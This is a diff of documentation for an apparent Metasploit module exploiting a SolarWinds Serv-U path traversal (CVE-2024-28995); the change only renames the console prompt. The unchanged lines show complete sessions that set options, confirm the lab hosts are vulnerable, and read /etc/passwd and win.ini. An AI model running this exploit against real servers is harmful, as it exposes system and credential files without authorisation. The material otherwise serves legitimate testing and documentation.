@@ -57,18 +57,18 @@ on both Linux and Windows, the value for this is 4. (default: 4).
 ### A vulnerable Linux target
 
 ```
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RHOST 192.168.86.43
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RHOST 192.168.86.43
 RHOST => 192.168.86.43
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RPORT 443
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RPORT 443
 RPORT => 443
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set SSL true
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set SSL true
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => true
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set STORE_LOOT false
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set STORE_LOOT false
 STORE_LOOT => false
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set TARGETFILE /etc/passwd
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set TARGETFILE /etc/passwd
 TARGETFILE => /etc/passwd
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > show options
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > show options
 
 Module options (auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995):
 
@@ -87,9 +87,9 @@ Module options (auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > check
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > check
 [+] 192.168.86.43:443 - The target is vulnerable. SolarWinds Serv-U version 15.4.2.126 (Linux 64-bit; Version: 6.5.0-15-generic)
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
 [*] Running module against 192.168.86.43
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -146,22 +146,22 @@ fwupd-refresh:x:129:137:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
 xrdp:x:130:138::/run/xrdp:/usr/sbin/nologin
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > 
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > 
 ```
 
 ### A vulnerable Windows target
 
 ```
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RHOST 192.168.86.68
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RHOST 192.168.86.68
 RHOST => 192.168.86.68
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RPORT 80
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set RPORT 80
 RPORT => 80
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set SSL false
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set SSL false
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => false
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set TARGETFILE c:\\\\Windows\\win.ini
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > set TARGETFILE c:\\\\Windows\\win.ini
 TARGETFILE => c:\\Windows\win.ini
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > show options 
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > show options 
 
 Module options (auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995):
 
@@ -180,9 +180,9 @@ Module options (auxiliary/gather/solarwinds_servu_fileread_cve_2024_28995):
 
 View the full module info with the info, or info -d command.
 
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > check
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > check
 [+] 192.168.86.68:80 - The target is vulnerable. SolarWinds Serv-U version 15.4.2.126 (Windows Server 2012 64-bit; Version: 6.2.9200)
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
 [*] Running module against 192.168.86.68
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -197,5 +197,5 @@ msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) > run
 MAPI=1
 
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) >
+msf auxiliary(gather/solarwinds_servu_fileread_cve_2024_28995) >
 ```
